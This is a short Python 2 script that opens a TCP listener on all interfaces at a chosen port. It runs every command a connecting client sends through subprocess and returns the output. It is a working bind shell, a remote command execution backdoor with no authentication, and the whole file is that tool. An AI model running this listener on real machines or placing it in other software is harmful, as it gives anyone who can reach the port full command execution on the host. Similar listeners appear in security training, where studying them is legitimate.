import sys, getopt
from subprocess import Popen, PIPE
import sys
import socket
import threading

def showHelp():
    print("This will display the command options")
    print("-h, --help . . . . print this message")
    print("-p, --port <port>  . . . . . . . port")

def program(data):
    bind_ip = "0.0.0.0"
    bind_port = data
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bind_ip,bind_port))
    server.listen(5)
    print "[*] Listening on %s:%d" % (bind_ip,bind_port)

    while True:
        try:
            client,addr = server.accept()
            print "[*] Accepted connection from: %s:%d" % (addr[0],addr[1])
            # spin up our client thread to handle incoming data
            client_handler = threading.Thread(target=handle_client,args=(client,))
            client_handler.start()
        except KeyboardInterrupt:
            print "Session aborted."
            sys.exit(0)

# this is our client-handling thread
def handle_client(client_socket):
    # print out what the client sends
    request = client_socket.recv(1024)
    data = str(request)
    processData(data, client_socket)
    # send back a packet
    client_socket.send("\n\nClose.")
    client_socket.close()

def processData(d, client_socket):
    print "[*] Input receieved: %s" % (d)
    d = d.split()
    msg = [""]
    p = Popen(d, stdout=PIPE, bufsize=1)
    with p.stdout:
        for line in iter(p.stdout.readline, b''):
            msg.append(line)
    p.wait() # wait for the subprocess to exit
    for i in msg:
        client_socket.send(i)


def main(argv):
    tmp_data = 0
    try:
        opts, args = getopt.getopt(argv,"hp:",["help", "port="])
    except getopt.GetoptError:
        showHelp()
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            showHelp()
            sys.exit()
        elif opt in ("-p", "--port"):
            tmp_data = int(arg)
        else:
            showHelp()
            sys.exit()
    program(tmp_data)

if __name__ == "__main__":
   main(sys.argv[1:])
